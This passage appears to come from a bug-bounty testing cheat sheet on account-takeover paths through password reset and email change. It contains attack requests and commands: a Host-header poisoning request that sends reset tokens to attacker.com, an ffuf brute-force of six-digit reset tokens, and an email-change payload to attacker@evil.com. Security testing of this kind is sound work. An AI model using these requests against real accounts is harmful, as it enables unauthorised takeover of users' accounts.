## 13. ATO — ACCOUNT TAKEOVER TAXONOMY

### Path 1: Password Reset Poisoning
```bash
POST /forgot-password
Host: attacker.com          # or X-Forwarded-Host: attacker.com
email=victim@company.com
# Reset link sent to attacker.com/reset?token=XXXX
```

### Path 2: Reset Token in Referrer Leak
```
GET /reset-password?token=ABC123
→ page loads: <script src="https://analytics.com/track.js">
→ Referer: https://target.com/reset-password?token=ABC123 sent to analytics
```

### Path 3: Predictable / Weak Reset Tokens
```bash
# Brute force 6-digit numeric token
ffuf -u "https://target.com/reset?token=FUZZ" \
     -w <(seq -w 000000 999999) -fc 404 -t 50
```

### Path 4: Token Not Expiring
```
Request token → wait 2 hours → still works? = bug
Request token #1 → request token #2 → use token #1 → still works? = bug
```

### Path 5: Email Change Without Re-Auth
```bash
PUT /api/user/email
{"new_email": "attacker@evil.com"}   # no current_password required
```

### Path 6: Reset Doesn't Invalidate Old Sessions
```
1. Victim logged in (session cookie S). Attacker triggers/knows a reset OR victim resets after breach.
2. Password changes → is session S still valid?
3. If old sessions survive a password reset = attacker who had a session keeps access forever.
```
Also test the inverse: after **you** change your password, do the victim-facing tokens (API keys, OAuth grants, "app passwords") rotate? Non-rotation post-reset is a real High. **Confirm:** replay the pre-reset cookie/token after the change and get 200 authenticated.

### Path 7: Reset Token / OTP Leaked in Response Body
```
POST /forgot-password  →  200 {"status":"sent","reset_token":"abc","otp":"123456"}
GET  /api/user/2/reset →  token present in JSON, HTML comment, or redirect Location
```
Devs return the token for their front-end to consume and forget it's attacker-visible. Diff the full response (and any `Location:`/Set-Cookie) — the token often hides in an unused field. **Confirm:** use the leaked token to complete reset on the victim account.

### Path 8: Pre-Account-Takeover
Account created *before* the victim, then merged when they arrive:
- **Unverified→verified merge:** register `victim@corp.com` with password; when victim later signs up via SSO, some apps *merge* into your existing account (you keep access).
- **SSO-then-password:** register the email via social login (no password), attacker later sets a password via "forgot password" on the same email if the app allows both auth methods on one account.
**Confirm:** after the victim's real signup/SSO, your original credentials still log into their account. FP-kill: if signup returns "email already exists" and no merge happens, it's not exploitable.

### ATO Priority Chain
- Critical: no-user-interaction ATO
- High: requires one email click OR existing session
- Medium: requires phishing + user interaction
- Low: requires attacker to be MitM

